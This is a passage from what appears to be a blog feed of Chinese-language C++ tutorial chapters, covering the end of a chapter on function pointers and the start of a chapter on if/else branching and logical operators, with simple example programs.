&lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    CheckFunction checker = is_negative;</span><br><span class="line">    DisplayFunction printer = show_message;</span><br><span class="line"></span><br><span class="line">    print_if(<span class="number">-5</span>, checker, printer);</span><br><span class="line">    print_if(<span class="number">10</span>, checker, printer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用类型别名可以显著提高涉及函数指针的代码的可读性。</p><p><strong>总结:</strong></p><p>函数指针是 C++ 中一个强大的特性，它允许将函数视为数据进行传递和存储。虽然语法可能初看起来有些复杂，但通过 <code>typedef</code> 或 <code>using</code> 可以简化。理解函数指针对于掌握回调机制、某些设计模式以及与 C 库交互非常重要。在现代 C++ 中，函数对象（Functors）和 Lambda 表达式（将在后续章节介绍）提供了更灵活、有时更方便的替代方案，但函数指针仍然有其用武之地。</p><h2 id="7-11-总结"><a href="#7-11-总结" class="headerlink" title="7.11 总结"></a>7.11 总结</h2><p>本章深入探讨了函数这一 C++ 编程的基本模块，涵盖了函数定义、调用、参数传递机制以及如何将函数与各种数据类型（数组、字符串、结构、对象）结合使用。</p><p>主要内容回顾：</p><ol><li><p> <strong>函数基础:</strong> 复习了函数的定义（返回类型、名称、参数列表、函数体）、函数原型（声明函数接口以供编译器使用）和函数调用（执行函数代码）。</p></li><li><p><strong>参数传递:</strong></p><ul><li>  <strong>按值传递 (Pass by Value):</strong> C++ 的默认方式，适用于基本类型、结构和类对象。函数操作的是实参的副本，不影响原始数据，但可能因复制大型对象而效率低下。</li><li>  <strong>数组传递:</strong> C 风格数组传递时会退化为指向首元素的指针，函数直接操作原始数组，效率高但丢失大小信息，需额外传递大小或使用指针区间。<code>const</code> 可用于保护数组内容。</li><li>  <strong>二维数组传递:</strong> 必须在函数参数中指定除第一维之外的所有维度的大小。</li><li>  <strong>结构传递:</strong> 默认按值传递。为提高效率或允许修改，可传递结构指针 (<code>struct_type*</code>)，使用 <code>-&gt;</code> 访问成员，或使用引用（第 8 章内容）。</li><li>  <strong><code>std::string</code> 和 <code>std::array</code> 对象传递:</strong> 默认按值传递，但通常推荐<strong>按常量引用 (<code>const T&amp;</code>)</strong> 传递以获得效率和安全性，或按引用 (<code>T&amp;</code>) 传递以允许修改。</li></ul></li><li><p><strong>函数与特定类型:</strong></p><ul><li>  <strong>C-风格字符串:</strong> 作为 <code>char*</code> 传递，依赖 <code>\0</code> 结束符。返回 C 风格字符串比较复杂，推荐让调用者提供缓冲区。</li><li>  <strong><code>std::string</code> 对象:</strong> 使用 <code>const std::string&amp;</code> 传递是常用方式。返回 <code>std::string</code> 通常因 RVO/NRVO 而高效。</li><li>  <strong><code>std::array</code> 对象:</strong> 行为类似结构，大小是类型的一部分。推荐使用 <code>const std::array&lt;T, N&gt;&amp;</code> 传递。</li></ul></li><li><p> <strong>递归:</strong> 函数调用自身来解决问题。需要明确的<strong>基线条件</strong>来停止递归，以及使问题规模缩小的<strong>递归步骤</strong>。递归可以使某些问题的代码简洁，但可能效率低或导致栈溢出。</p></li><li><p> <strong>函数指针:</strong> 指向函数地址的指针变量。允许将函数作为参数传递、在运行时选择函数等。声明时需匹配函数签名（返回类型和参数类型）。<code>typedef</code> 或 <code>using</code> 可简化其声明。</p></li></ol><p>通过本章的学习，我们掌握了如何有效地定义和使用函数来构建模块化、可重用和可维护的 C++ 程序，并了解了不同数据类型在函数参数传递中的行为和最佳实践。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 6 分支语句和逻辑运算符</title>
      <link href="2025/04/26/Cpp_tutorial_Chapter_6/"/>
      <url>2025/04/26/Cpp_tutorial_Chapter_6/</url>
      
        <content type="html"><![CDATA[<h2 id="6-1-if语句"><a href="#6-1-if语句" class="headerlink" title="6.1 if语句"></a>6.1 if语句</h2><p>分支语句允许程序根据特定条件选择执行不同的代码路径。<code>if</code> 语句是 C++ 中最基本的分支结构，它允许程序根据一个<strong>条件表达式 (Condition)</strong> 的真假来决定是否执行某段代码。</p><p><strong>基本语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    <span class="comment">// 如果 condition 为 true，则执行这里的语句</span></span><br><span class="line">    statement1;</span><br><span class="line">    statement2;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 或者如果只有一条语句</span></span><br><span class="line"><span class="keyword">if</span> (condition)</span><br><span class="line">    single_statement;</span><br></pre></td></tr></table></figure><ul><li>  <strong><code>condition</code></strong>: 一个求值为布尔值 (<code>true</code> 或 <code>false</code>) 的表达式。通常是关系表达式（如 <code>x &gt; 5</code>, <code>name == &quot;Alice&quot;</code>）或逻辑表达式。非零值被视为 <code>true</code>，零值被视为 <code>false</code>。</li><li>  <strong><code>&#123; ... &#125;</code></strong>: 花括号定义了一个语句块。如果条件为 <code>true</code>，则执行块内的所有语句。如果只有一条语句需要根据条件执行，可以省略花括号，但为了清晰和避免错误，<strong>通常推荐总是使用花括号</strong>。</li></ul><p><strong>执行流程:</strong></p><ol><li> 计算 <code>condition</code> 的值。</li><li> 如果 <code>condition</code> 为 <code>true</code>，执行 <code>if</code> 语句后面的语句（或语句块）。</li><li> 如果 <code>condition</code> 为 <code>false</code>，跳过 <code>if</code> 语句后面的语句（或语句块），继续执行 <code>if</code> 结构之后的代码。</li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temperature;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the current temperature (Celsius): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; temperature;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 简单的 if 语句</span></span><br><span class="line">    <span class="keyword">if</span> (temperature &gt; <span class="number">30</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;It&#x27;s hot outside!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Remember to stay hydrated.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (temperature &lt; <span class="number">10</span>)</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;It&#x27;s cold, wear a jacket!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 只有一条语句，可以省略花括号</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Temperature check finished.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，如果用户输入的 <code>temperature</code> 大于 30，会打印两条消息；如果小于 10，会打印另一条消息；否则，这些 <code>if</code> 块内的代码会被跳过。</p><h3 id="6-1-1-if-else语句"><a href="#6-1-1-if-else语句" class="headerlink" title="6.1.1 if else语句"></a>6.1.1 if else语句</h3><p><code>if</code> 语句允许我们在条件为真时执行代码，但如果我们希望在条件为假时执行<strong>另一段</strong>代码，就需要使用 <code>if else</code> 结构。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    <span class="comment">// 如果 condition 为 true，执行这里的语句块 (if block)</span></span><br><span class="line">    statement_block_1;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果 condition 为 false，执行这里的语句块 (else block)</span></span><br><span class="line">    statement_block_2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>执行流程:</strong></p><ol><li> 计算 <code>condition</code> 的值。</li><li> 如果 <code>condition</code> 为 <code>true</code>，执行 <code>if</code> 后面的语句块 (<code>statement_block_1</code>)，然后跳过 <code>else</code> 后面的语句块 (<code>statement_block_2</code>)。</li><li> 如果 <code>condition</code> 为 <code>false</code>，跳过 <code>if</code> 后面的语句块 (<code>statement_block_1</code>)，执行 <code>else</code> 后面的语句块 (<code>statement_block_2</code>)。</li><li> 执行完选择的块后，程序继续执行 <code>if else</code> 结构之后的代码。</li></ol><p><strong>关键点:</strong> <code>if</code> 块和 <code>else</code> 块是<strong>互斥</strong>的，程序只会执行其中一个。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your age: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (age &gt;= <span class="number">18</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You are eligible to vote.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You are not yet eligible to vote.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">int</span> years_to_wait = <span class="number">18</span> - age;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You need to wait &quot;</span> &lt;&lt; years_to_wait &lt;&lt; <span class="string">&quot; more year(s).&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age check complete.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序会根据用户输入的年龄，打印两条不同的消息之一。</p><h3 id="6-1-2-格式化if-else语句"><a href="#6-1-2-格式化if-else语句" class="headerlink" title="6.1.2 格式化if else语句"></a>6.1.2 格式化if else语句</h3><p>清晰的代码格式对于可读性和可维护性至关重要。对于 <code>if else</code> 语句，推荐遵循以下格式化约定：</p><ol><li> <strong>使用花括号 <code>&#123;&#125;</code>:</strong> 即使 <code>if</code> 或 <code>else</code> 后面只有一条语句，也推荐使用花括号。这可以防止在后续添加代码时引入悬挂 <code>else</code> (dangling else) 等错误，并使代码结构更清晰。</li><li> <strong>缩进:</strong> <code>if</code> 和 <code>else</code> 块内部的语句应该相对于 <code>if</code> 和 <code>else</code> 关键字进行缩进（通常是 4 个空格或一个制表符）。</li><li> <strong><code>else</code> 的位置:</strong> <code>else</code> 关键字通常与对应的 <code>if</code> 语句的右花括号 <code>&#125;</code> 放在同一行，或者单独放在下一行并与 <code>if</code> 对齐。两种风格都很常见。</li></ol><p><strong>示例 (推荐的格式):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 风格 1: else 与 if 的 &#125; 在同一行</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    <span class="comment">// ... statements ...</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="comment">// ... statements ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 风格 2: else 单独一行，与 if 对齐</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    <span class="comment">// ... statements ...</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// ... statements ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不推荐的格式 (即使只有一条语句)</span></span><br><span class="line"><span class="comment">// if (condition) statement1; else statement2; // 可读性差，易出错</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 推荐的格式 (即使只有一条语句)</span></span><br><span class="line"><span class="keyword">if</span> (condition) &#123;</span><br><span class="line">    statement1;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    statement2;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>悬挂 <code>else</code> 问题:</strong></p><p>当 <code>if</code> 语句嵌套且省略花括号时，<code>else</code> 会与<strong>最近的未匹配的 <code>if</code></strong> 相关联，这可能不符合预期。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误的意图 (可能想让 else 对应外层 if)</span></span><br><span class="line"><span class="keyword">if</span> (a &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> (b &gt; <span class="number">0</span>) </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Both positive&quot;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">// 这个 else 实际上对应的是 if (b &gt; 0)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a is not positive&quot;</span>; <span class="comment">// 这行不会按预期执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确的写法 (使用花括号明确关联)</span></span><br><span class="line"><span class="keyword">if</span> (a &gt; <span class="number">0</span>) &#123; <span class="comment">// 外层 if</span></span><br><span class="line">    <span class="keyword">if</span> (b &gt; <span class="number">0</span>) &#123; <span class="comment">// 内层 if</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Both positive&quot;</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">// 没有 else 对应内层 if</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123; <span class="comment">// 这个 else 对应外层 if (a &gt; 0)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a is not positive&quot;</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>始终使用花括号可以完全避免悬挂 <code>else</code> 问题。</p><h3 id="6-1-3-if-else-if-else结构"><a href="#6-1-3-if-else-if-else结构" class="headerlink" title="6.1.3 if else if else结构"></a>6.1.3 if else if else结构</h3><p>当需要从多个互斥的选项中选择一个执行路径时，可以使用 <code>if else if else</code> 结构。它本质上是一系列嵌套的 <code>if else</code> 语句，但通常写成更扁平的结构。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (condition1) &#123;</span><br><span class="line">    <span class="comment">// 如果 condition1 为 true，执行这里的语句块</span></span><br><span class="line">    statement_block_1;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (condition2) &#123;</span><br><span class="line">    <span class="comment">// 如果 condition1 为 false 且 condition2 为 true，执行这里的语句块</span></span><br><span class="line">    statement_block_2;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (condition3) &#123;</span><br><span class="line">    <span class="comment">// 如果 condition1 和 condition2 都为 false 且 condition3 为 true，执行这里的语句块</span></span><br><span class="line">    statement_block_3;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// ... 可以有更多的 else if 分支</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果以上所有条件都为 false，执行这里的语句块 (可选的默认分支)</span></span><br><span class="line">    statement_block_default;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>执行流程:</strong></p><ol><li> 从上到下依次检查每个 <code>if</code> 和 <code>else if</code> 的条件。</li><li> 一旦找到第一个为 <code>true</code> 的条件，就执行其对应的语句块。</li><li> 执行完该块后，<strong>跳过</strong>所有剩余的 <code>else if</code> 和 <code>else</code> 分支，直接执行整个 <code>if else if else</code> 结构之后的代码。</li><li> 如果所有的 <code>if</code> 和 <code>else if</code> 条件都为 <code>false</code>，则执行最后的 <code>else</code> 块（如果存在）。如果不存在最后的 <code>else</code> 块，则整个结构什么也不执行。</li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> score;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your numerical score (0-100): &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; score;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> grade;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (score &lt; <span class="number">0</span> || score &gt; <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid score entered.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        grade = <span class="string">&#x27;I&#x27;</span>; <span class="comment">// Invalid</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">90</span>) &#123;</span><br><span class="line">        grade = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        grade = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">70</span>) &#123;</span><br><span class="line">        grade = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">        grade = <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// score &lt; 60</span></span><br><span class="line">        grade = <span class="string">&#x27;F&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (grade != <span class="string">&#x27;I&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Your grade is: &quot;</span> &lt;&lt; grade &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子根据分数范围判断对应的等级。程序会按顺序检查条件，一旦满足一个（例如 <code>score &gt;= 80</code>），就会确定等级为 ‘B’，并跳过后续的 <code>else if</code> 和 <code>else</code>。最后的 <code>else</code> 处理所有低于 60 分的情况。</p><h2 id="6-2-逻辑表达式"><a href="#6-2-逻辑表达式" class="headerlink" title="6.2 逻辑表达式"></a>6.2 逻辑表达式</h2><p>在 <code>if</code> 或循环的条件中，我们常常需要组合多个关系表达式或者对某个条件取反。<strong>逻辑运算符 (Logical Operators)</strong> 用于组合或修改已有的布尔表达式（或可以转换为布尔值的表达式），生成一个新的布尔结果 (<code>true</code> 或 <code>false</code>)。</p><p>C++ 主要提供三种逻辑运算符：</p><ul><li>  <strong>逻辑或 (Logical OR): <code>||</code></strong></li><li>  <strong>逻辑与 (Logical AND): <code>&amp;&amp;</code></strong></li><li>  <strong>逻辑非 (Logical NOT): <code>!</code></strong></li></ul><h3 id="6-2-1-逻辑OR运算符："><a href="#6-2-1-逻辑OR运算符：" class="headerlink" title="6.2.1 逻辑OR运算符：||"></a>6.2.1 逻辑OR运算符：||</h3><p>逻辑或运算符 <code>||</code> 用于连接两个表达式。如果<strong>至少有一个</strong>操作数为 <code>true</code>，则整个 <code>||</code> 表达式的结果为 <code>true</code>。只有当<strong>两个</strong>操作数都为 <code>false</code> 时，结果才为 <code>false</code>。</p><p><strong>真值表:</strong></p><p>| 操作数1 | 操作数2 | <code>操作数1 || 操作数2</code> |<br>| :—— | :—— | :——————- |<br>| <code>true</code>  | <code>true</code>  | <code>true</code>               |<br>| <code>true</code>  | <code>false</code> | <code>true</code>               |<br>| <code>false</code> | <code>true</code>  | <code>true</code>               |<br>| <code>false</code> | <code>false</code> | <code>false</code>              |</p><p><strong>用法与示例:</strong></p><p><code>||</code> 常用于检查多个条件中是否至少有一个满足。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> input_char;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a character: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; input_char;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查字符是否是元音字母 (忽略大小写)</span></span><br><span class="line">    <span class="keyword">if</span> (input_char == <span class="string">&#x27;a&#x27;</span> || input_char == <span class="string">&#x27;e&#x27;</span> || input_char == <span class="string">&#x27;i&#x27;</span> || </span><br><span class="line">        input_char == <span class="string">&#x27;o&#x27;</span> || input_char == <span class="string">&#x27;u&#x27;</span> || input_char == <span class="string">&#x27;A&#x27;</span> || </span><br><span class="line">        input_char == <span class="string">&#x27;E&#x27;</span> || input_char == <span class="string">&#x27;I&#x27;</span> || input_char == <span class="string">&#x27;O&#x27;</span> || </span><br><span class="line">        input_char == <span class="string">&#x27;U&#x27;</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; input_char &lt;&lt; <span class="string">&quot;&#x27; is a vowel.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;&#x27;&quot;</span> &lt;&lt; input_char &lt;&lt; <span class="string">&quot;&#x27; is not a vowel.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">25</span>;</span><br><span class="line">    <span class="keyword">bool</span> has_ticket = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">// 检查是否满足入场条件 (年龄小于 12 或持有门票)</span></span><br><span class="line">    <span class="keyword">if</span> (age &lt; <span class="number">12</span> || has_ticket) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Allowed entry.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Entry denied.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-2-2-逻辑AND运算符：-amp-amp"><a href="#6-2-2-逻辑AND运算符：-amp-amp" class="headerlink" title="6.2.2 逻辑AND运算符：&amp;&amp;"></a>6.2.2 逻辑AND运算符：&amp;&amp;</h3><p>逻辑与运算符 <code>&amp;&amp;</code> 用于连接两个表达式。只有当<strong>两个</strong>操作数都为 <code>true</code> 时，整个 <code>&amp;&amp;</code> 表达式的结果才为 <code>true</code>。只要有<strong>至少一个</strong>操作数为 <code>false</code>，结果就为 <code>false</code>。</p><p><strong>真值表:</strong></p><table><thead><tr><th align="left">操作数1</th><th align="left">操作数2</th><th align="left"><code>操作数1 &amp;&amp; 